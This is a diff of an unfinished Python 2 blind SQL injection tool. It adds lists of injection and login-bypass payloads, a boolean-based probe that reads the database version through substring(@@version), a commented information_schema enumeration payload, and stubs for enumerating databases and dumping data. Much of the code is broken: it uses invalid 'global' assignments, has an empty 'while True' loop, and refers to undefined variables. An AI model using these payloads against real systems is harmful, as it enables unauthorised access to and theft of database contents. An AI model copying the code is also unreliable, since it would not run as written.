@@ -8,12 +8,11 @@ import sys, getopt
 import urllib2, requests
 from optparse import OptionParser
 
-# --------- Variables ----------
-
-l_injnum = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2", "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x'='p'#"]
-l_bypass = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2", "' and '1'='2'--", "1/* comment */"]
-l_bypass2 = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2", "') and '1'='2'--"]
-alphabet = "abcdefghijklmnopqrstuvwxyz"
+# --------- Global variables ----------
+global l_injnum = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2", "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x'='p'#"]
+global l_bypass = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2", "' and '1'='2'--", "1/* comment */"]
+global l_bypass2 = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2", "') and '1'='2'--"]
+global alphabet = "abcdefghijklmnopqrstuvwxyz"
 
 # --------- Main function option parsing ----------
 def main():
@@ -36,45 +35,83 @@ python sql.py TODO include args"""
     # Affect options argument to variables
     (options, args) = parser.parse_args()
 
-    URL                 = options.URL
-    BYPASS_DETECT       = options.BYPASS_DETECT
-    ENUM                = options.ENUM
-    DUMP                = options.DUMP
-    DATABASE            = options.DATABASE
+    url                 = options.URL
+    bypass_detect       = options.BYPASS_DETECT
+    enum                = options.ENUM
+    dump                = options.DUMP
+    database            = options.DATABASE
 
     # TODO algo principal ici
+    # Enumerer le nombre de colonnes de la table courante pour l'injection
+    # Trouver un bypass
+    find_bypass(url)
+    # Trouver la version du serveur SQL
+    sql_version(url, bypass)
+    # Récupérer la base de données courantes et les autres bases de données
+    # Pour chaque base database
+        # Récupérer les tables
+        # Pour chaque table
+            # Récupérer le nombre de colonnes
 
 # --------- Find the proper bypass ----------
-def find_bypass():
+def find_bypass(url):
+    for bypass in l_injnum,l_bypass,l_bypass2:
+        pass
     pass
 
 # --------- Find the numer of columns ----------
-def find_nb_columns():
+def enum_columns(url, bypass):
     pass
 
 # --------- Find SQL database version ----------
-def sql_version():
-    pass
+def sql_version(url, bypass):
+    for sql_version in range(4,7):
+        # uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
+        uri = url + "' and "  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
+        server_response = request_handler(uri)
+        server_response_status = validate_request(server_response)
+        if server_response_status is False:
+            server_version = sql_version - 1
+            if server_version == 4:
+                print "SQL version 4 detected... Not yet supported!"
+                sys.exit()
 
-# --------- Find the current database ----------
-def current_database():
-    pass
+    return server_version
 
 # --------- Enumerate databases ----------
-def eunum_databases():
+def eunum_databases(url, bypass):
+    # ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '
+    # TODO Find out how many databases by playing with limit
+    database_increment = 1
+    while True:
     pass
 
 # --------- Enumerate database tables ----------
-def enum_tables():
+def enum_tables(url, bypass, database):
     pass
 
 # --------- Dump the database ----------
-def exfiltrate_data():
+def exfiltrate_data(url, bypass, database):
     pass
 
-# --------- Contruct & send HTTP requests ----------
-def request_handler():
-    pass
+# --------- Forge & send HTTP requests ----------
+def request_handler(url):
+    # Create session if it doesn't exist
+    if not session:
+        session = requests.session()
+
+    page = session.get(url + request + bypass)
+
+    return page
+
+# --------- Confirm that request was executed ----------
+def validate_request(page):
+    if re.search('You are welcome', page):
+        return True
+    if re.search('Get lost',page):
+        return False
+    if page == "":
+        print "Error: request returned empty page!"
 
 if __name__ == "__main__":
     main()
